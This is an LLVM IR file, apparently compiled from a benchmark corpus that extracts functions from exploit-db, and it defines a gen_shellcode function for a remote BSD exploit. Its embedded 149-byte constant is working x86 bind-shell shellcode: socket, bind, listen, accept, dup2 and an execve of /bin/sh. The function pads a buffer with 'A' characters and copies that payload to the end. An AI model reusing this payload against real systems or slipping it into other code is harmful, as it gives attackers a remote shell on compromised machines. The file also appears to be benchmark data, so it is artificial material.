; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_432.c_gen_shellcode.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_432.c_gen_shellcode.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.gen_shellcode.shellcode = private unnamed_addr constant [149 x i8] c"1\C01\C91\D2\B0aQ\B1\06Q\B1\01Q\B1\02Q\8D\0C$Q\CD\80\B1\021\C9QQQ\80\C1wfQ\B5\02fQ\8D\0C$\B2\10RQP\8D\0C$Q\89\C21\C0\B0h\CD\80\B3\01SR\8D\0C$Q1\C0\B0j\CD\801\C0PPR\8D\0C$Q1\C9\B0\1E\CD\80\89\C3SQ1\C0\B0Z\CD\80ASQ1\C0\B0Z\CD\80ASQ1\C0\B0Z\CD\801\DBShn/shh//bi\89\E31\C0PTSP\B0;\CD\801\C0\B0\01\CD\80\00", align 16

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @gen_shellcode(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca [149 x i8], align 16
  store i32 %0, i32* %2, align 4
  %6 = bitcast [149 x i8]* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %6, i8* align 16 getelementptr inbounds ([149 x i8], [149 x i8]* @__const.gen_shellcode.shellcode, i32 0, i32 0), i64 149, i1 false)
  %7 = getelementptr inbounds [149 x i8], [149 x i8]* %5, i64 0, i64 0
  %8 = call i32 @strlen(i8* %7)
  store i32 %8, i32* %3, align 4
  %9 = load i32, i32* %2, align 4
  %10 = add nsw i32 %9, 1
  %11 = call i64 @malloc(i32 %10)
  %12 = inttoptr i64 %11 to i8*
  store i8* %12, i8** %4, align 8
  %13 = load i8*, i8** %4, align 8
  %14 = load i32, i32* %2, align 4
  %15 = call i32 @memset(i8* %13, i32 65, i32 %14)
  %16 = load i8*, i8** %4, align 8
  %17 = load i32, i32* %2, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i32, i32* %3, align 4
  %21 = sext i32 %20 to i64
  %22 = sub i64 0, %21
  %23 = getelementptr inbounds i8, i8* %19, i64 %22
  %24 = getelementptr inbounds [149 x i8], [149 x i8]* %5, i64 0, i64 0
  %25 = load i32, i32* %3, align 4
  %26 = add nsw i32 %25, 1
  %27 = call i32 @memcpy(i8* %23, i8* %24, i32 %26)
  %28 = load i8*, i8** %4, align 8
  ret i8* %28
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @strlen(i8*) #2

declare dso_local i64 @malloc(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
